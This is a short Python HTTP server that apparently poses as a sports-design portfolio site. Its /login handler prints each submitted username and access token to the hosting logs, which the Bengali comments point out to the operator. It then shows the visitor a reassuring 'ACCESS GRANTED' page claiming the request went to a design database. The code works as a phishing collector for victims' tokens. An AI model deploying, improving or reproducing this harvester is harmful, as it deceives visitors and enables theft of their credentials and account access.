import http.server
import urllib.parse
import os

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            fields = urllib.parse.parse_qs(post_data)
            
            # Render-এর ড্যাশবোর্ডে "Logs" ট্যাবে এই ক্লায়েন্ট ডেটা দেখা যাবে
            print("\n" + "="*45)
            print("[+] NEW PORTFOLIO ACCESS ATTEMPT:")
            print(f"Client Name: {fields.get('username', [''])}")
            print(f"Access Token: {fields.get('token', [''])}")
            print("="*45 + "\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # ক্লায়েন্ট সাবমিট করার পর ব্রাউজারে এই স্পোর্টস থিম মেসেজটি দেখাবে
            success_html = """
            <html>
            <body style="background-color: #060814; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
                <h2 style="color: #ff4757;">✔ ACCESS GRANTED!</h2>
                <p style="color: #a4b0be;">আপনার কাস্টম স্পোর্টস ডিজাইন ডাটাবেজে রিকোয়েস্ট পাঠানো হয়েছে।</p>
            </body>
            </html>
            """
            self.wfile.write(success_html.encode('utf-8'))
        else:
            super().do_POST()

port = int(os.environ.get("PORT", 8080))
server_address = ('', port)
httpd = http.server.HTTPServer(server_address, MyHandler)
print(f"[*] Sports Design Server Running on port {port}...")
httpd.serve_forever()
